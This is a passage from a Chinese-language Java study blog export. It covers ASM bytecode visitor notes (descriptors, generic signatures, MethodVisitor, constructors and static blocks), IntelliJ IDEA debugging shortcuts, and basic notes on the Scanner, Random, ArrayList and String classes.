<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">"I"</span>        = <span class="keyword">int</span></span><br><span class="line"><span class="string">"B"</span>        = <span class="keyword">byte</span></span><br><span class="line"><span class="string">"C"</span>        = <span class="keyword">char</span></span><br><span class="line"><span class="string">"D"</span>        = <span class="keyword">double</span></span><br><span class="line"><span class="string">"F"</span>        = <span class="keyword">float</span></span><br><span class="line"><span class="string">"J"</span>        = <span class="keyword">long</span></span><br><span class="line"><span class="string">"S"</span>        = <span class="keyword">short</span></span><br><span class="line"><span class="string">"Z"</span>        = <span class="keyword">boolean</span></span><br><span class="line"><span class="string">"V"</span>        = <span class="keyword">void</span></span><br><span class="line"><span class="string">"[...;"</span>    = 数组</span><br><span class="line"><span class="string">"[[...;"</span>   = 二维数组</span><br><span class="line"><span class="string">"[[[...;"</span>  = 三维数组</span><br><span class="line"><span class="string">"L....;"</span>   = 引用类型</span><br></pre></td></tr></table></figure>

<p>下面是一些方法签名对应的方法参数列表:</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509162013272.png" alt="image-20200509162013272"></p>
<p><strong>第四个参数：</strong>凡是具有泛型信息的方法，该参数都会有值。并且该值的内容信息基本等于第三个参数的拷贝，只不过不同的是泛型参数被特殊标记出来。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">List</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">halloAop</span><span class="params">(V abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/Object;</span><br><span class="line">泛型签名：(TV;I)TT;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">List</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">halloAop</span><span class="params">(V abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/String;</span><br><span class="line">泛型签名：(TV;I)Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>可以看出泛型信息中用于标识泛型类型的结构是（“T” + 泛型名 + “;”），还有一种情况就是。泛型是声明在方法上。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T extends List&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/String;</span><br><span class="line">泛型签名：&lt;T::Ljava/util/List;&gt;(TT;I)Ljava/lang/String; <span class="comment">//泛型类型基于接口</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/lang/Object;I)Ljava/lang/String;</span><br><span class="line">泛型签名：&lt;T:Ljava/lang/Object;&gt;(TT;I)Ljava/lang/String; <span class="comment">//泛型类型基于类型</span></span><br></pre></td></tr></table></figure>

<p><strong>第五个参数：</strong>用来表示将会抛出的异常，如果方法不会抛出异常。则该参数为空。这个参数的表述形式比较简单，举一个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable,Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">异常参数为：[java/lang/Throwable, java/lang/Exception]</span><br></pre></td></tr></table></figure>

<h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>假设有下面这样的一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Javap可以得到下面这样的输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ javap -c classtest.DemoClass</span><br><span class="line">Compiled from <span class="string">"DemoClass.java"</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classtest</span>.<span class="title">DemoClass</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> classtest.DemoClass();</span><br><span class="line">  Code:</span><br><span class="line">   <span class="number">0</span>:   aload_0</span><br><span class="line">   1:   invokespecial   #8; //Method java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">   <span class="number">4</span>:   <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>;</span><br><span class="line">  Code:</span><br><span class="line">   0:   getstatic       #16; //Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   3:   invokevirtual   #22; //Method java/io/PrintStream.println:()V</span><br><span class="line">   <span class="number">6</span>:   <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出其实Java编译完这个类之后是产生了两个方法。其中一个是第四行表示的“public classtest.DemoClass();”它是构造方法。</p>
<p>和第十行表示的“main”方法。下面这段例子用来扫描这个类的这两个方法，我们的扫描逻辑很简单就是当遇到一个定义的方法时输出这个方法名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(DemoClass<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        cr.accept(<span class="keyword">new</span> DemoClassVisitor(), ClassReader.SKIP_DEBUG);</span><br><span class="line">        System.out.println(<span class="string">"---ALL END---"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoClassVisitor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method "</span> + name);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        MethodVisitor superMV = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DemoMethodVisitor(superMV, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoMethodVisitor</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String methodName;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoMethodVisitor</span><span class="params">(MethodVisitor mv, String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM4, mv);</span><br><span class="line">        <span class="keyword">this</span>.methodName = methodName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method ‘"</span> + methodName + <span class="string">"’ Begin..."</span>);</span><br><span class="line">        <span class="keyword">super</span>.visitCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method ‘"</span> + methodName + <span class="string">"’End."</span>);</span><br><span class="line">        <span class="keyword">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>上面这段程序首先在第三行使用 ClassReader 去读取 DemoClass 类的字节码信息。</li>
<li>其次通过“cr.accept(new DemoClassVisitor(), ClassReader.SKIP_DEBUG);”方法开始Visitor扫描整个字节码。</li>
<li>SKIP_DEBUG选项的意义是在扫描过程中掠过所有有关行号方面的内容。</li>
<li>在DemoClassVisitor类中我们重写了visitMethod方法，当遇到方法的时候打印出方法名。</li>
<li>随后我们返回DemoMethodVisitor对象，用以输出方法的开始和结束。</li>
</ol>
<p>上面这段程序的输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">at Method &lt;init&gt;</span><br><span class="line">at Method ‘&lt;init&gt;’ Begin...</span><br><span class="line">at Method ‘&lt;init&gt;’End.</span><br><span class="line">at Method main</span><br><span class="line">at Method ‘main’ Begin...</span><br><span class="line">at Method ‘main’End.</span><br><span class="line">---ALL END---</span><br></pre></td></tr></table></figure>

<p>下面是这个MethodVisitor接口的所有方法定义:</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509163546690.png" alt="image-20200509163546690"></p>
<p>虽然该接口的方法数量如此之多，甚至是ClassVisitor接口的3倍以上。但是值得我们关心的接口只有下面这几个，其余的都是和代码有关系：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MethodVisitor.visitCode();</span><br><span class="line">MethodVisitor.visitMaxs(maxStack, maxLocals);</span><br><span class="line">MethodVisitor.visitEnd();</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个方法：表示ASM开始扫描这个方法。</li>
<li>第二个方法：该方法是visitEnd之前调用的方法，可以反复调用。用以确定类方法在执行时候的堆栈大小。</li>
<li>第三个方法：表示方法输出完毕。</li>
</ul>
<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>关于方法名或许读者注意到了在扫描这个类的时候，有一个特殊的方法被扫描到了“<init>”，这个方法是传说中的构造方法。当Java在编译的时候没有发现类文件中有构造方法的定义会为其创建一个默认的无参构造方法。这个“<init>”就是那个由系统添加的构造方法。现在我们为类填写一个构造方法如下：</init></init></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoClass</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次扫描这个类，你会发现它的结果和刚才是一样的，这是由于我们编写的构造方法替换了系统默认生成的那个。</p>
<h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><p>在Class我们接触过用“static {  }”包含的代码，这个是我们常说的静态代码块。这个代码快ASM在扫描字节码的时候也会遇到它，大家可千万别以为这真的是一个什么代码块。所有的静态代码快最后都会放到“<clinit>”方法中。</clinit></p>
<p>静态代码快只有一个，现有下面这个的一个类。在编写这个类的时候我有意的写了两个不同的静态代码块的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        System.out.println(<span class="number">11</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        System.out.println(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ASM在扫描这个类的时候你会发现虽然类中存在多个静态代码快，但是最后类文件中只会出现了一个“<clinit>”方法。JVM在编译Class的时候估计已经将多个静态代码块合并到一起了。</clinit></p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509165603790.png" alt="image-20200509165603790"></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>ASM</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA Debug笔记</title>
    <url>/IDEA-Debug%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>无惛惛之事者，无赫赫之功。</p>
</blockquote>
<p>今天来学习IDEA的Debug调试技巧。</p>
<a id="more"></a>

<h1 id="Debug简介和意义"><a href="#Debug简介和意义" class="headerlink" title="Debug简介和意义"></a>Debug简介和意义</h1><p>什么是程序DeBug？</p>
<ol>
<li><p>Debug，是程序开发人员必会的一项调试程序的技能。</p>
</li>
<li><p>企业中程序开发和程序调试的比例为1:1.5，可以说如果你不会调试程序，你就没有办法从事编程工作。</p>
</li>
</ol>
<p>Debug能帮助我们做什么？</p>
<ol>
<li>追踪代码的运行流程。</li>
<li>程序运行异常定位。</li>
<li>线上问题追踪。</li>
</ol>
<p>Debug对于程序学习者的意义</p>
<ol>
<li>通过调试能够更好的查看程序的执行流程。</li>
<li>复杂的程序逻辑，通过老师的口述讲解，很难理解清楚，这个时候借助调试能够很好的帮助同学们理解程序。</li>
<li>定位问题，提高自我解决问题的能力。</li>
</ol>
<h1 id="IDEA中的Debug步骤"><a href="#IDEA中的Debug步骤" class="headerlink" title="IDEA中的Debug步骤"></a>IDEA中的Debug步骤</h1><ol>
<li><p>设置断点（F9）</p>
</li>
<li><p>调试程序（8个按钮）</p>
</li>
</ol>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_162216.jpg" alt="2019-09-28_162216"></p>
<table>
<thead>
<tr>
<th>钮</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_163744.jpg" alt></td>
<td>(Alt + F10)：如果你的光标在其它行或其它页面，点击这个按钮可跳转到当前代码执行的行</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164022.jpg" alt></td>
<td>(F8)：步过，一行一行地往下走，如果这一行上有方法不会进入方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_162345.jpg" alt>))</td>
<td>(F7)：步入。如果当前行有方法，可以进入方法内部，一般用于进入自定义方法内，不会进入官方类库的方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164200.jpg" alt></td>
<td>(Alt + Shift + F7)：强制步入，能进入任何方法，查看底层源码的时候可以用这个进入官方类库的方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164215.jpg" alt></td>
<td>(Shift + F8)：步出，从步入的方法内退出到方法调用处，此时方法已执行完毕，只是还没有完成赋值。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164428.jpg" alt></td>
<td>回退断点。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164418.jpg" alt></td>
<td>(Alt + F9)：运行到光标处，你可以将光标定位到你需要查看的那一行，然后使用这个功能，代码会运行至光标行，而不需要打断点。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164437.jpg" alt></td>
<td>(Alt + F8)：计算表达式。</td>
</tr>
</tbody></table>
<ol start="3">
<li>观察变量<ol>
<li>查看变量有三种方式：<ol>
<li>程序区查看变量</li>
<li>Debugger的Variables中查看变量</li>
<li>鼠标悬停到变量名上会弹出当前变量的值</li>
</ol>
</li>
</ol>
</li>
</ol>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_165050.jpg" alt="2019-09-28_165050"></p>
<ol start="4">
<li>查看输出</li>
</ol>
<h1 id="跳转到当前代码执行的行"><a href="#跳转到当前代码执行的行" class="headerlink" title="跳转到当前代码执行的行"></a>跳转到当前代码执行的行</h1><p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_163744.jpg" alt="2019-09-28_163744"></p>
<ul>
<li><p>跳转到当前代码执行的行（Alt + F10）</p>
</li>
<li><p>作用</p>
<ul>
<li>使程序窗口切换到当前正在运行的程序处。</li>
</ul>
</li>
</ul>
<h1 id="步过调试的使用"><a href="#步过调试的使用" class="headerlink" title="步过调试的使用"></a>步过调试的使用</h1><ul>
<li><p>步过调试</p>
<ul>
<li>步过调试按钮（F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164022.jpg" alt="2019-09-28_164022"></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li>步过，一行一行地往下走，如果这一行上有方法不会进入方法。</li>
<li>常用于调试过程中不想进入调用的方法体的情况。</li>
</ul>
</li>
</ul>
<h1 id="步入调试的使用"><a href="#步入调试的使用" class="headerlink" title="步入调试的使用"></a>步入调试的使用</h1><p>步入调试</p>
<ul>
<li>步过调试按钮（F7）</li>
</ul>
<ul>
<li><p>作用</p>
<ul>
<li><p>步入，一行一行地往下走，如果这一行上有方法，则进入方法内部。</p>
</li>
<li><p>一般用于进入自定义方法内，不会进入官方类库的方法。</p>
</li>
</ul>
</li>
</ul>
<h1 id="强制步入调试的使用"><a href="#强制步入调试的使用" class="headerlink" title="强制步入调试的使用"></a>强制步入调试的使用</h1><ul>
<li><p>强制步入调试</p>
<ul>
<li>强制步入调试按钮（Alt + Shift + F7）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164200.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li><p>进入官方类库方法</p>
</li>
<li><p>帮助我们学习和查看JDK源码</p>
</li>
</ul>
</li>
</ul>
<h1 id="步出调试的使用"><a href="#步出调试的使用" class="headerlink" title="步出调试的使用"></a>步出调试的使用</h1><ul>
<li><p>步出调试</p>
<ul>
<li>步出调试按钮（Shift + F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164215.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li>从方法内退出到方法调用处。</li>
<li>调试的时候，有时候会跳入到自己不想查看的方法体，这个时候使用步出。</li>
</ul>
</li>
</ul>
<h1 id="回退断点调试的使用"><a href="#回退断点调试的使用" class="headerlink" title="回退断点调试的使用"></a>回退断点调试的使用</h1><ul>
<li><p>回退断点</p>
<ul>
<li>回退断点按钮 <img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164428.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li><p>回退到当前方法的调用处。</p>
</li>
<li><p>当想重新查看该方法体的执行过程时，不用重新启动Debug，可以使用回退断点方式。</p>
</li>
</ul>
</li>
</ul>
<h1 id="运行到光标处"><a href="#运行到光标处" class="headerlink" title="运行到光标处"></a>运行到光标处</h1><p>运行到光标处</p>
<ul>
<li>运行光标处按钮 （F9）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164418-8044630.jpg" alt></li>
<li>作用<ul>
<li>使程序运行到光标处，而无需设置断点。</li>
</ul>
</li>
</ul>
<h1 id="计算表达式"><a href="#计算表达式" class="headerlink" title="计算表达式"></a>计算表达式</h1><ul>
<li><p>计算表达式</p>
<ul>
<li>计算表达式按钮（Alt + F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164437.jpg" alt="2019-09-28_164437"></li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-03_182159.jpg" alt="2019-10-03_182159"></p>
<ul>
<li>作用<ul>
<li>设置变量，在计算表达式的框里，可以改变变量的值，这样有时候就能很方便我们去调试各种值的情况了。 </li>
</ul>
</li>
</ul>
<h1 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h1><ul>
<li><p>条件断点</p>
<ul>
<li>右键单击断点处，可以设置进入断点的条件</li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-03_182101.jpg" alt="2019-10-03_182101"></p>
<ul>
<li>作用<ul>
<li>通过设置断点条件，在满足条件时，才停在断点处，否则直接运行。</li>
</ul>
</li>
</ul>
<h1 id="多线程调试"><a href="#多线程调试" class="headerlink" title="多线程调试"></a>多线程调试</h1><ul>
<li>步骤<ul>
<li>多线程调试，需要调整断点挂起级别为Thread</li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-05_164127.jpg" alt="2019-10-05_164127"></p>
<ul>
<li>Frame中选择线程进行调试</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础温习</title>
    <url>/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>锲而不舍，金石可镂。</p>
</blockquote>
<p>今天来总结Java基础，来填本科的坑。</p>
<p>本篇将会是一纸长文，会陆续更新。</p>
<a id="more"></a>

<h1 id="Scanner-类"><a href="#Scanner-类" class="headerlink" title="Scanner 类"></a>Scanner 类</h1><blockquote>
<p>java.lang.String : 接受用户的键盘输入</p>
</blockquote>
<p>导包的一般步骤：</p>
<ol>
<li><p>导包：</p>
<p>import 包路径.类名称</p>
<p>如果需要使用的目标类，和当前位于同一个包下，则可以省略导包语句不写。</p>
<p>只有<code>java.lang</code>包下的内容不需要导包，其他的包都需要import语句。</p>
</li>
<li><p>创建：</p>
<p>类名称 对象名 = new 类名称（）；</p>
</li>
<li><p>使用</p>
<p>对象名.方法名（）;</p>
</li>
</ol>
<p>Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> i = sc.nextInt();<span class="comment">//接收一个int数字</span></span><br><span class="line">String str = sc.next();<span class="comment">//接收一个String字符串</span></span><br></pre></td></tr></table></figure>

<h1 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h1><p>创建对象的标准格式：</p>
<figure class="highlight plain"><figcaption><span>对象名 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">匿名对象就是只有右边的对象，没有左边的名字和赋值运算符。</span><br><span class="line"></span><br><span class="line">``` new 类名称（）；</span><br></pre></td></tr></table></figure>

<p>匿名对象只能使用唯一的一次，下次再用不得不再创建一个新对象。</p>
<p>如果确定有一个对象只需要使用唯一的一次，就可以用匿名对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">System.out.println(<span class="string">"输入的是"</span>+num);</span><br></pre></td></tr></table></figure>



<h1 id="Random类"><a href="#Random类" class="headerlink" title="Random类"></a>Random类</h1><blockquote>
<p>java.util.Random 生成伪随机数。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> Random();</span><br><span class="line"><span class="keyword">int</span> i = r.nextInt();</span><br><span class="line"><span class="comment">//public int nextInt(int n)</span></span><br><span class="line"><span class="comment">//返回一个随机数，范围在[0，n）之间，左闭右开</span></span><br></pre></td></tr></table></figure>

<h1 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h1><blockquote>
<p>java.util.ArrayList</p>
<p>大小可变的集合，长度动态增长</p>
<p>ArrayList<String> list = new ArrayList&lt;&gt;();</String></p>
</blockquote>
<h2 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h2><ul>
<li><code>public boolean add(E e)</code>：将指定的元素添加到集合尾部</li>
<li><code>public E remove(int index)</code>：移除指定下标元素，返回被删除的元素。</li>
<li><code>public E get(int index)</code>：捕获此集合中指定位置上的元素。</li>
<li><code>public int size()</code>：返回此集合中的元素数。遍历集合时，可以控制索引范围，防止越界。</li>
</ul>
<h2 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h2><p>ArrayList对象不能存储基本类型，只能存储引用类型的数据。</p>
<p>类似<code>&lt;int&gt;</code>不能写，但是存储基本数据类型对应的包装类型是可以的。所以，想要存储基本类型数据，必须转换后才能编写，转换写法如下：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200428120710735.png" alt="image-20200428120710735"></p>
<h1 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h1><blockquote>
<p>java.lang.String  底层是字符数组</p>
</blockquote>
<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul>
<li><code>public String(char[] value)</code>：通过当前参数中的字符数组来构造新的String。</li>
<li><code>public String(byte[] bytes)</code>：通过使用平台的默认字符集解码当前参数中的字节数组来构造新的 String。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo01</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建字符串对象</span></span><br><span class="line">String s1 = <span class="string">"hello"</span>;</span><br><span class="line">String s2 = <span class="string">"hello"</span>;</span><br><span class="line">String s3 = <span class="string">"HELLO"</span>;</span><br><span class="line"><span class="comment">// boolean equals(Object obj):比较字符串的内容是否相同</span></span><br><span class="line">System.out.println(s1.equals(s2)); <span class="comment">// true</span></span><br><span class="line">System.out.println(s1.equals(s3)); <span class="comment">// false</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">//boolean equalsIgnoreCase(String str):比较字符串的内容是否相同,忽略大小写</span></span><br><span class="line">System.out.println(s1.equalsIgnoreCase(s2)); <span class="comment">// true</span></span><br><span class="line">System.out.println(s1.equalsIgnoreCase(s3)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取功能的方法"><a href="#获取功能的方法" class="headerlink" title="获取功能的方法"></a>获取功能的方法</h2><ul>
<li><p><code>public int length ()</code>：返回此字符串的长度。 </p>
</li>
<li><p><code>public String concat (String str)</code>：将指定的字符串连接到该字符串的末尾。 </p>
</li>
<li><p><code>public char charAt (int index)</code> ：返回指定索引处的 char值。 </p>
</li>
<li><p><code>public int indexOf (String str)</code> ：返回指定子字符串第一次出现在该字符串内的索引。</p>
</li>
<li><p><code>public String substring (int beginIndex)</code> ：返回一个子字符串，从beginIndex开始截取字符串到字符 串结尾。 </p>
</li>
<li><p><code>public String substring (int beginIndex, int endIndex)</code> ：返回一个子字符串，从beginIndex到 endIndex截取字符串。含beginIndex，不含endIndex。</p>
</li>
</ul>
